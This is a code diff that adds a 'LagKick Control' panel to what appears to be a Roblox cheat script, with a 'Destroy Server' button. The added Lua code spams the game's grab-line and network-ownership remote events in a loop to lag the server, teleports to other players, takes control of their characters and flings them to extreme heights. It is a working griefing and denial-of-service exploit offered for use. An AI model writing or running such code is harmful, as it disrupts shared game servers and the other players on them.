@@ -4368,7 +4368,214 @@ do
             end
         end
     })
-    
+    -- =====================================================
+-- LagKick Control (Ragdollタブに追加)
+-- =====================================================
+local LagKick = {
+    Enabled = false,
+    SelectedHeight = "Spawn",
+    Running = false,
+}
+
+local _LagPlayers = game:GetService("Players")
+local _LagLocalPlayer = _LagPlayers.LocalPlayer
+local _LagRS = game:GetService("ReplicatedStorage")
+local _LagWorkspace = game:GetService("Workspace")
+local _LagGrabEvents = _LagRS:FindFirstChild("GrabEvents")
+
+_G.LineLagPacketCount = 10
+local lineLagThread = nil
+local lineLagEnabled = false
+
+local function getAllPlayers()
+    local players = {}
+    for _, plr in pairs(_LagPlayers:GetPlayers()) do
+        if plr ~= _LagLocalPlayer then
+            table.insert(players, plr)
+        end
+    end
+    return players
+end
+
+local function spamOwnership(hrp)
+    if not _LagGrabEvents then return end
+    local setOwner = _LagGrabEvents:FindFirstChild("SetNetworkOwner")
+    if setOwner and hrp then
+        pcall(function() setOwner:FireServer(hrp, hrp.CFrame) end)
+    end
+end
+
+local function teleportToPlayer(myHrp, targetHrp)
+    if not myHrp or not targetHrp then return end
+    pcall(function()
+        myHrp.CFrame = targetHrp.CFrame * CFrame.new(0, 5, 5)
+        myHrp.AssemblyLinearVelocity = Vector3.zero
+    end)
+end
+
+local function destroyLineOnPlayer(hrp)
+    if not _LagGrabEvents then return end
+    local createLine = _LagGrabEvents:FindFirstChild("CreateGrabLine")
+    local destroyLine = _LagGrabEvents:FindFirstChild("DestroyGrabLine")
+    if not createLine or not destroyLine then return end
+    pcall(function()
+        createLine:FireServer(hrp, CFrame.new(0, 1e9, 0))
+        task.wait()
+        destroyLine:FireServer(hrp)
+    end)
+end
+
+local function startLineLag()
+    if lineLagEnabled then return end
+    lineLagEnabled = true
+    lineLagThread = task.spawn(function()
+        if not _LagGrabEvents then return end
+        local createLine = _LagGrabEvents:FindFirstChild("CreateGrabLine")
+        if not createLine then
+            Library:Notify({ Title = "Error", Description = "CreateGrabLine not found", Time = 3 })
+            return
+        end
+        local packetCount = _G.LineLagPacketCount or 10
+        while lineLagEnabled do
+            local target = _LagWorkspace:FindFirstChild("SpawnLocation") 
+                or _LagWorkspace:FindFirstChild("Spawn") 
+                or (_LagLocalPlayer.Character and _LagLocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
+            if target then
+                for i = 1, packetCount do 
+                    local randomX = math.random(-1e9, 1e9)
+                    local randomZ = math.random(-1e9, 1e9)
+                    pcall(function() 
+                        createLine:FireServer(target, CFrame.new(randomX, 0, randomZ)) 
+                    end)
+                end
+            end
+            task.wait(0.05) 
+        end
+    end)
+end
+
+local function stopLineLag()
+    lineLagEnabled = false
+    if lineLagThread then 
+        task.cancel(lineLagThread) 
+        lineLagThread = nil
+    end
+end
+
+-- =====================================================
+-- UI追加
+-- =====================================================
+local LagKickGroup = Tabs.Ragdoll:AddLeftGroupbox("LagKick Control")
+
+LagKickGroup:AddDropdown("HeightMode", {
+    Values = { "Spawn (Ground)", "Heaven" },
+    Default = 1,
+    Text = "Height Mode",
+    Callback = function(Value)
+        LagKick.SelectedHeight = (Value == "Heaven") and "Heaven" or "Spawn"
+    end,
+})
+
+LagKickGroup:AddButton({
+    Text = "🚀 Destroy Server",
+    Tooltip = "全てのプレイヤーを円形に配置し、サーバーにラグを発生させます",
+    Func = function()
+        if LagKick.Running then
+            Library:Notify({ Title = "Already Running", Description = "Destroy Server is already in progress", Time = 3 })
+            return
+        end
+        LagKick.Running = true
+        Library:Notify({ Title = "⚠️", Description = "Destroy Server Started!", Time = 2 })
+        task.spawn(function()
+            local height = (LagKick.SelectedHeight == "Heaven") and 1e9 or 35
+            startLineLag()
+            task.wait(1)
+            local players = getAllPlayers()
+            if #players == 0 then
+                stopLineLag()
+                LagKick.Running = false
+                Library:Notify({ Title = "Error", Description = "No players found", Time = 3 })
+                return
+            end
+            Library:Notify({ Title = "Target", Description = #players .. " players found", Time = 2 })
+            local myChar = _LagLocalPlayer.Character
+            local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
+            if not myHrp then
+                stopLineLag()
+                LagKick.Running = false
+                return
+            end
+            local playerData = {}
+            for _, plr in ipairs(players) do
+                local char = plr.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    table.insert(playerData, { player = plr, hrp = hrp })
+                end
+            end
+            for _, data in ipairs(playerData) do
+                teleportToPlayer(myHrp, data.hrp)
+                task.wait(0.2)
+                spamOwnership(data.hrp)
+                task.wait()
+            end
+            local radius = 40
+            local angleStep = (math.pi * 2) / #playerData
+            for idx, data in ipairs(playerData) do
+                local angle = (idx - 1) * angleStep
+                local x = math.cos(angle) * radius
+                local z = math.sin(angle) * radius
+                pcall(function()
+                    data.hrp.CFrame = CFrame.new(x, height, z)
+                    data.hrp.AssemblyLinearVelocity = Vector3.zero
+                end)
+                local bp = Instance.new("BodyPosition")
+                bp.MaxForce = Vector3.new(1e9, 1e9, 1e9)
+                bp.P = 40000000
+                bp.Position = Vector3.new(x, height, z)
+                bp.Parent = data.hrp
+                task.delay(2, function() pcall(function() bp:Destroy() end) end)
+                task.wait()
+            end
+            for i = 1, 8 do
+                for _, data in ipairs(playerData) do
+                    destroyLineOnPlayer(data.hrp)
+                end
+                task.wait(0.3)
+            end
+            LagKick.Running = false
+            Library:Notify({ Title = "✔ Complete", Description = "Destruction complete!", Time = 3 })
+        end)
+    end,
+})
+
+LagKickGroup:AddButton({
+    Text = "⏹ Stop Lag",
+    Tooltip = "ラインラグを停止します",
+    Func = function()
+        stopLineLag()
+        LagKick.Running = false
+        Library:Notify({ Title = "Stopped", Description = "Lag stopped", Time = 2 })
+    end,
+})
+
+LagKickGroup:AddDivider()
+LagKickGroup:AddLabel("Status: Idle")
+
+local LagOptionGroup = Tabs.Ragdoll:AddRightGroupbox("LagKick オプション")
+
+LagOptionGroup:AddSlider("PacketCount", {
+    Text = "1回あたりのパケット数",
+    Default = 10,
+    Min = 1,
+    Max = 50,
+    Rounding = 0,
+    Suffix = "件",
+    Tooltip = "1ループで送信するライン作成リクエストの数",
+    Callback = function(Value)
+        _G.LineLagPacketCount = Value
+    end,
+})
     -- Loop Banana Ragdoll Toggle
     toggleRef = RagdollGroup:AddToggle("LoopBananaRagdoll", {
         Text = "Loop Banana Ragdoll",
